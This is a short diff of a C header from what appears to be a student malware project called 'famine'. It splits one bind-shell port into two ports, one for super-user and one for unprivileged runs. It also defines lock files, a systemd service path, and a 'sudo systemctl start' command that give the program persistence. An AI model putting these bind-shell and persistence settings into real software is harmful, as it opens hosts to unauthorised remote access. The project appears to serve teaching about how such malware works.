@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/04/19 11:01:52 by mbatty            #+#    #+#             */
-/*   Updated: 2026/04/19 11:03:11 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/05/23 11:16:42 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -21,7 +21,8 @@ typedef struct s_service_ctx
 #define SUPER_USER_LOCK_FILE "/var/lock/famine.lock"
 #define WEAK_LOCK_FILE "/tmp/famine.lock"
 
-#define BIND_SHELL_PORT 4242
+#define SUPER_USER_BIND_SHELL_PORT 4242
+#define WEAK_BIND_SHELL_PORT 6967
 
 #define SERVICE_FILE "/etc/systemd/system/famine.service"
 #define SERVICE_START "sudo systemctl start famine.service &"
